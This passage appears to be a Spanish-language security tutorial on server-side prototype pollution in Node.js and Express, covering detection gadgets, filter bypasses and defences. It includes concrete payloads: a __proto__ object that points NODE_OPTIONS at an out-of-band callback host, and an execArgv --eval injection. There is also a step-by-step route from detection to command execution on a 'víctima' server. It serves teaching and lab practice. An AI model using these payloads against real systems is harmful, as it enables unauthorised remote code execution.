Un enfoque consiste en intentar inyectar propiedades que coincidan con posibles opciones de configuración del servidor. Luego podemos comparar el comportamiento del servidor antes y después de la inyección para ver si este cambio de configuración parece haber surtido efecto. Si es así, esto es una fuerte indicación de que hemos encontrado un prototype pollution del lado del servidor

En esta sección, veremos las siguientes técnicas:

- Status code override

- JSON spaces override

- Charset override

Estas inyecciones no son destructivas pero aun así producen un cambio consistente y distintivo en el comportamiento del servidor cuando tienen éxito. Esta es solo una pequeña selección de técnicas potenciales para hacernos una idea de lo que es posible. Para más detalles técnicos y una visión de como se pudieron desarrollar estas técnicas, es recomendable leer este artículo [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

#### Status code override

Los frameworks de JavaScript del lado del servidor, como Express, permiten a los desarrolladores establecer códigos de estado HTTP personalizados en las respuestas. En el caso de errores, un servidor JavaScript puede emitir una respuesta HTTP genérica, pero también incluir un objeto de error en formato JSON en el body de la respuesta. Esta es una forma de proporcionar detalles adicionales sobre por qué ocurrió un error, el cual puede no ser evidente a partir del estado HTTP predeterminado

Aunque resulta algo engañoso, es bastante común recibir una respuesta `200 OK` y que el cuerpo de la respuesta contenga un objeto de error con un estado diferente:

```
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

El módulo `http-errors` de Node contiene la siguiente función para generar este tipo de respuestas de error:

```
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

La primera línea destacada intenta asignar la variable `status` leyendo la propiedad `status` o `statusCode` del objeto pasado a la función. Si los desarrolladores del sitio web no han establecido explícitamente una propiedad `status` para el error, podemos usar esto para detectar el prototype pollution de la siguiente manera:

1 - Encontrar una forma de desencadenar una respuesta de error y tomar nota del código de estado predeterminado

2 - Intentar llevar a cabo un prototype pollution con nuestra propia propiedad `status`. Debemos de asegurarnos de usar un código de estado poco común que sea improbable que se emita por cualquier otra razón

3 - Desencadenar la respuesta de error de nuevo y comprobar si hemos podido sobrescribir el código de estado con éxito

Es muy importante que elijamos un código de estado en el rango `400`-`599`. De lo contrario, Node utilizará el código de estado `500` por defecto, por lo que no sabremos si hemos podido envenenar el prototipo

#### JSON spaces override

El framework Express proporciona una opción llamada `json spaces`, que permite configurar el número de espacios usados para indentar los datos del JSON en la respuesta. En muchos casos, los desarrolladores dejan esta propiedad sin definir al estar conformes con el valor predeterminado, lo que la hace susceptible de poder sufrir un prototype pollution a través de la cadena de prototipos

Si tenemos acceso a cualquier tipo de respuesta JSON, podemos intentar realizar el prototype pollution con nuestra propia propiedad `json spaces` y luego reenviar la petición correspondiente para ver si la indentación del JSON aumenta en consecuencia. Podemos seguir los mismos pasos para eliminar la indentación y así confirmar la vulnerabilidad

Esta es una técnica especialmente útil porque no depende de que una propiedad específica se vea reflejada en la respuesta. Además, es extremadamente segura, ya que podemos activar y desactivar el prototype pollution simplemente restableciendo la propiedad al mismo valor que el predeterminado

Al intentar usar esta técnica desde Burpsuite, es importante usar el formato Raw del editor de mensajes. De lo contrario, no podremos apreciar el cambio en la identación, ya que la vista Pretty lo normaliza

Aunque el prototype pollution ha sido corregido en Express 4.17.4, los sitios web que no hayan actualizado pueden seguir siendo vulnerables

#### Charset override

Los servidores Express suelen implementar módulos denominados middleware que permiten el preprocesamiento de las peticiones antes de que sean pasadas a la función que las maneja. Por ejemplo, el módulo `body-parser` se usa habitualmente para parsear el cuerpo de las peticiones entrantes y generar un objeto `req.body`. Este contiene otro gadget que se puede usar para detectar el prototype pollution del lado del servidor

El siguiente código pasa un options object a la función `read()`, que se encarga de leer el body de la petición para parsearlo. Una de estas opciones es `encoding`, la cual determina qué codificación de caracteres se va a usar. Esta se obtiene bien de la propia petición mediante la llamada a la función `getCharset(req)`, o bien toma UTF-8 como valor predeterminado

```
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

Si observamos la función `getCharset()`, parece que los desarrolladores anticiparon que la cabecera `Content-Type` podría no contener un atributo `charset` explícito, por lo que implementaron una lógica que recurre a una cadena vacía en ese caso. Y esto es clave, ya que significa que podría ser controlable mediante prototype pollution

Si encontramos un objeto cuyas propiedades sean visibles en una respuesta, podemos usarlo para detectar fuentes. En el siguiente ejemplo, usaremos la codificación UTF-7 y una fuente JSON

1 - Añadir una cadena arbitraria codificada en UTF-7 a una propiedad que se refleje en una respuesta. Por ejemplo, `foo` en UTF-7 es `+AGYAbwBv-`

```
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "+AGYAbwBv-"
}
```

2 - Enviar la petición. Los servidores no usarán la codificación UTF-7 por defecto, por lo que esta cadena debería aparecer en la respuesta en su forma codificada

3 - Intentar realizar el prototype pollution con una propiedad `content-type` que especifique explícitamente el conjunto de caracteres UTF-7:

```
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "default",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
```

4 - Repitir la primera petición. Si hemos realizado el prototype pollution con éxito, la cadena UTF-7 debería aparecer ahora decodificada en la respuesta:

```
{
    "sessionId": "0123456789",
    "username": "wiener",
    "role": "foo"
}
```

Debido a un bug en el módulo `_http_incoming` de Node, esto funciona incluso cuando la cabecera `Content-Type` real de la petición incluye su propio atributo `charset`. Para evitar sobreescribir propiedades cuando una petición contiene cabeceras duplicadas, la función `_addHeaderLine()` comprueba que no exista ya ninguna propiedad con la misma clave antes de transferir las propiedades a un objeto `IncomingMessage`:

```
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

Si ya existe, la cabecera que se está procesando se descarta. Debido a la forma en que está implementado, esta comprobación (presumiblemente de forma no intencionada) incluye las propiedades heredadas a través de la cadena de prototipos. Esto significa que si realizamos el prototype pollution con nuestra propia propiedad `content-type`, la propiedad que representa la cabecera `Content-Type` real de la petición se descarta en este punto, junto con el valor previsto derivado de dicha cabecera

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Detecting server-side prototype pollution without polluted property reflection - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/)

### Escanear en busca de fuentes de prototype pollution del lado del servidor

Aunque es útil intentar testear manualmente las fuentes para afianzar la comprensión de la vulnerabilidad, en la práctica esto puede resultar repetitivo y llevar mucho tiempo. Por esta razón, es recomendable usar la extensión Server-Side Prototype Pollution Scanner[https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8](https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8) de Burpsuite

#### Bypassear filtros de entrada para prototype pollution del lado del servidor

Los sitios web frecuentemente intentan prevenir o parchear las vulnerabilidades de prototype pollution filtrando claves sospechosas como `\_\_proto\_\_`. Este enfoque de saneamiento de claves no es una solución robusta a largo plazo, ya que existen diversas formas de evadirlo. Por ejemplo, un atacante puede:

- Ofuscar las palabras clave prohibidas para que pasen desapercibidas durante el saneamiento

- Acceder al prototipo mediante la propiedad `constructor` en lugar de `\_\_proto\_\_`

Las aplicaciones Node también pueden eliminar o deshabilitar `\_\_proto\_\_` por completo usando los indicadores de línea de comandos `--disable-proto=delete` o `--disable-proto=throw` respectivamente. Sin embargo, esto también puede eludirse utilizando la técnica del constructor

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Bypassing flawed input filters for server-side prototype pollution - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/)

### Remote code execution mediante un prototype pollution del lado del servidor

Mientras que el prototype pollution del lado del cliente suele exponer el sitio web vulnerable a DOM XSS, el del lado del servidor puede llegar a derivarse en un remote code execution

#### Identificar una petición vulnerable

Existen varios sinks de ejecución de comandos en Node, muchos de ellos en el módulo `child_process`. Estos suelen invocarse mediante una petición que ocurre de forma asíncrona respecto a la petición con la que podemos contaminar el prototipo. Por eso, la mejor forma de identificarlos es envenenar el prototipo con un payload que dispare una interacción con Burpsuite Collaborator al ser ejecutado

La variable de entorno `NODE_OPTIONS` permite definir una cadena de argumentos de línea de comandos que se usarán por defecto cada vez que se inicie un nuevo proceso Node. Como también es una propiedad del objeto `env`, podemos controlarla mediante prototype pollution si está sin definir

Algunas funciones de Node para crear procesos hijo aceptan la propiedad opcional `shell`, que permite a los desarrolladores especificar una shell concreto (como bash) en la que ejecutar comandos. Combinando esto con una propiedad `NODE_OPTIONS` maliciosa, podemos envenenar el prototipo de forma que se genere una interacción con Burpsuite Collaborator cada vez que se crea un nuevo proceso Node. Así podemos identificar fácilmente cuándo una petición crea un proceso hijo con argumentos de línea de comandos controlables vía prototype pollution

```
"__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=TU-ID-COLLABORATOR.oastify.com\"\".oastify\"\".com"
}
```

#### Remote code execution mediante child_process.fork()

Métodos como `child_process.spawn()` y `child_process.fork()` permiten a los desarrolladores crear nuevos subprocesos Node. El método `fork()` acepta un options object en el que una de las propiedades posibles es `execArgv`. Esta propiedad es un array de strings con argumentos de línea de comandos que se usarán al lanzar el proceso hijo. Si los desarrolladores lo dejan sin definir, también puede controlarse mediante prototype pollution

Como este gadget nos permite controlar directamente los argumentos de línea de comandos, da acceso a vectores de ataque que no serían posibles con `NODE_OPTIONS`. En particular, el argumento `--eval` permite inyectar código JavaScript que será ejecutado por el proceso hijo, pudiendo incluso cargar módulos adicionales:

```
"execArgv": [
    "--eval=require('<módulo>')"
]
```

Además de `fork()`, el módulo `child_process` contiene el método `execSync()`, que ejecuta una cadena arbitraria como comando del sistema. Encadenando estos sinks de inyección de ćodigo JavaScript y de comandos, podemos escalar el prototype pollution a un remote code execution

En este `laboratorio` vemos como `aplicar` esta `técnica`:

- Remote code execution via server-side prototype pollution - [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/)

## Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

## ¿Cómo detectar y explotar un prototype pollution?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - Primero nos vamos a centrar en buscar los prototype pollution del lado del cliente. Para ello, vamos a usar el DOM Invader. Para ver como se usa lo podemos hacer en este laboratorio [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-5/)

2 - Puede darse el caso de que pulsemos sobre Exploit en Dom Invader y que el exploit no funcione. Esto puede deberse a algo como lo que pasa en este laboratorio [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/). Si se da algo así, tendremos que inspeccionar el código JavaScript y ver que está pasando

3 - Para los prototype pollution del lado del servidor prefiero hacer todo el proceso de forma manual para evitar romper nada. Lo primero que tenemos que hacer es identificar si existe un prototype pollution con alguno de los métodos que aparecen en este laboratorio [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-7/)

4 - Si no funciona usando estos métodos puede ser porque se esté bloqueando \_\_proto\_\_ u otra cadena que estamos usando. Para estos casos, vamos a usar las formas alternativas que se ven en los laboratorios [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-8/) y [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-3/)

5 - Una vez ya funcione todo, nos tenemos que intentar convertir en usuario administrador

6 - Una vez lo hayamos hecho, vamos a seguir los pasos que se realizan en este laboratorio y vamos a ejecutar comandos en el servidor víctima [https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/](https://justice-reaper.github.io/posts/Prototype-Pollution-Lab-9/)

## Prevenir un prototype pollution

`Es recomendable corregir cualquier prototype pollution que indentifiquemos en nuestros sitios web, independientemente de si están vinculados a gadgets explotables`. `Aunque estemos seguros de no haber pasado ninguno por alto, no hay garantía de que futuras actualizaciones de nuestro propio código o de las bibliotecas que usamos no introduzcan nuevos gadgets, abriendo la puerta a exploits viables`

En esta `sección`, `ofreceremos algunos consejos generales sobre las medidas que podemos tomar para proteger nuestros propios sitios web frente a las amenazas que hemos tratado en los laboratorios`. También cubriremos algunos `errores comunes` que se deben `evitar`

### Sanitizar las claves de las propiedades

`Una de las formas más evidentes de prevenir un prototype pollution es sanitizar las claves de las propiedades antes de fusionarlas con objetos existentes`. Así podemos `evitar` que `un atacante inyecte claves como \_\_proto\_\_, que hacen referencia al prototipo del objeto`

`Usar una lista de claves permitidas es la forma más eficaz de lograrlo`. Sin embargo, `como esto no es viable en muchos casos, es habitual recurrir a una lista de claves no permitidas`. De esta forma, `se eliminaría de la entrada del usuario cualquier cadena potencialmente peligrosa`

`Aunque es una solución rápida de implementar, una lista de claves no permitidas verdaderamente robusta es inherentemente complicada`. Del mismo modo, `las implementaciones débiles también pueden eludirse mediante técnicas de ofuscación sencillas`. Por este motivo, `esta opción solo es recomendable como medida provisional y no como solución a largo plazo`

### Impedir cambios en los objetos prototipo

`Un enfoque más robusto para prevenir un prototype pollution es impedir por completo que los objetos prototipo sean modificados`

`Invocar el método Object.freeze() sobre un objeto garantiza que sus propiedades y sus valores ya no puedan modificarse, y que no se puedan añadir nuevas propiedades`. `Como los prototipos son en sí mismos objetos, podemos usar este método para cortar de forma proactiva cualquier fuente potencial`:

```
Object.freeze(Object.prototype);
```

`El método Object.seal() es similar, pero sigue permitiendo cambios en los valores de las propiedades existentes`. Puede ser una `buena alternativa` si por alguna razón `no podemos usar Object.freeze()`

### Impedir que un objeto herede propiedades

`Aunque podemos usar Object.freeze() para bloquear posibles fuentes de prototype pollution, también podemos tomar medidas para eliminar gadgets`. De este modo, `aunque un atacante identifique un prototype pollution, es probable que no sea explotable`

Por defecto, `todos los objetos heredan del Object.prototype global, ya sea directamente o de forma indirecta a través de la cadena de prototipos`. Sin embargo, `también podemos establecer manualmente el prototipo de un objeto creándolo con el método Object.create()`. `Esto no solo nos permite asignar cualquier objeto como prototipo del nuevo objeto, sino que también podemos crear el objeto con un prototipo null, lo que garantiza que no heredará ninguna propiedad en absoluto`

```
let myObject = Object.create(null);
Object.getPrototypeOf(myObject); // null
```

### Usar alternativas más seguras cuando sea posible

`Otra defensa robusta contra el prototype pollution es usar objetos que ofrezcan protección integrada`. Por ejemplo, `en lugar de usar un options object, podríamos usar un map`. `Aunque un map también puede heredar propiedades maliciosas, dispone del método integrado get() que solo devuelve las propiedades definidas directamente en el propio map`:

```
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;                  // 'polluted'
options.get('evil');           // undefined
options.get('transport_url'); // 'https://normal-website.com'
```

`Set es otra alternativa si simplemente almacenamos valores en lugar de pares clave:valor`. `Al igual que los maps, los conjuntos proporcionan métodos integrados que solo devuelven las propiedades definidas directamente en el propio objeto`:

```
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;         // 'polluted'
options.has('evil');  // false
options.has('safe');  // true
```